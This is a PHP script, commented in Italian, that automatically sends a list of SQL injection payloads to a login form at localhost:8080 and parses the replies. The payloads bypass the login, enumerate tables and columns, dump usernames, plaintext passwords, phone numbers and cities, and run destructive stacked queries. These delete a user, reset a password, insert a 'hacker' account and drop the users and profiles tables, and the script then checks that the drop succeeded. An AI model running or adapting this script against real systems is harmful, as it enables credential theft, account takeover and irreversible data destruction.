<?php
$target = "http://localhost:8080";
$table_dropped = false;

$payloads = [
    "' OR 1=1; --",
    "admin' -- ",
    "' UNION SELECT NULL, GROUP_CONCAT(table_name), NULL FROM information_schema.tables WHERE table_schema = DATABASE()-- -",
    "' UNION SELECT NULL, GROUP_CONCAT(column_name), NULL FROM information_schema.columns WHERE table_name='profiles' AND table_schema=DATABASE()-- -",
    "' UNION SELECT NULL, GROUP_CONCAT(column_name), NULL FROM information_schema.columns WHERE table_name='users' AND table_schema=DATABASE()-- -",
    "' UNION SELECT id, username, password FROM users-- -",
    "' UNION SELECT user_id, telefono, citta FROM profiles-- -",
    "'; DELETE FROM users WHERE username='mario.rossi'; --",
    "'; UPDATE users SET password='123456' WHERE username='anna.neri'; -- ",
    "'; INSERT INTO users (username, password) VALUES ('hacker', 'hacked123'); SELECT * FROM users WHERE 1=1; --",
    "'; DROP TABLE profiles; DROP TABLE users; --"
];

foreach ($payloads as $payload) {
    if ($table_dropped && str_contains($payload, 'users')) {
        echo "\n[!] SKIPPATO: Tabella users già eliminata\n";
        echo "-----------------------------\n";
        continue;
    }

    $username = urlencode($payload);
    $password = urlencode($payload);
    $url = "$target?username=$username&password=$password";

    echo "\n[+] Testando: $payload\n";
    $response = @file_get_contents($url);

    if ($response === false) {
        echo "[-] Errore connessione\n";
        echo "-----------------------------\n";
        continue;
    }

    // Intercetta errori (class="error-row")
    if (preg_match('/<div class="error-row">(.*?)<\/div>/is', $response, $err_match)) {
        $err_msg = trim(strip_tags($err_match[1]));
        echo "[-] ERRORE SITO: $err_msg\n";
        if (str_contains($err_msg, "mancante o eliminata")) {
            $table_dropped = true;
        }
        echo "-----------------------------\n";
        continue;
    }

    // Verifica DROP TABLE
    if (str_contains($payload, 'DROP TABLE')) {
        $verify_url = "$target?username=" . urlencode("' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=DATABASE() -- ") . "&password=123";
        $verify_response = @file_get_contents($verify_url);
        if ($verify_response === false || strpos($verify_response, 'users') === false) {
            echo "[+] SUCCESS: Tabelle eliminate con successo\n";
            $table_dropped = true;
        } else {
            echo "[-] FAIL: Tabelle ancora presenti\n";
        }
        echo "-----------------------------\n";
        continue;
    }

    // Parsing risultati reali: <div class="success-row"><strong>Dato trovato:</strong> val1 | val2 | val3</div>
    if (preg_match_all('/<div class="success-row">(.*?)<\/div>/is', $response, $matches)) {
        $rows = $matches[1];
        echo "[*] " . count($rows) . " risultato/i trovato/i:\n";

        foreach ($rows as $row) {
            // Rimuove il tag <strong>Dato trovato:</strong> e pulisce
            $clean = preg_replace('/<strong>.*?<\/strong>/i', '', $row);
            $clean = trim(html_entity_decode(strip_tags($clean)));
            $cols  = array_map('trim', explode('|', $clean));

            if (str_contains($payload, 'information_schema') || str_contains($payload, 'GROUP_CONCAT')) {
                echo "    colonne: $clean\n";
            } elseif (str_contains($payload, 'profiles')) {
                $uid  = $cols[0] ?? '';
                $tel  = $cols[1] ?? '';
                $city = $cols[2] ?? '';
                echo "    user_id: $uid | telefono: $tel | citta: $city\n";
            } else {
                $id   = $cols[0] ?? '';
                $user = $cols[1] ?? '';
                $pass = $cols[2] ?? '';
                echo "    id: $id | username: $user | password: $pass\n";
            }
        }
    } else {
        echo "[-] Nessun risultato (Invalid credentials o query non ha restituito righe)\n";
    }

    echo "-----------------------------\n";
}
?>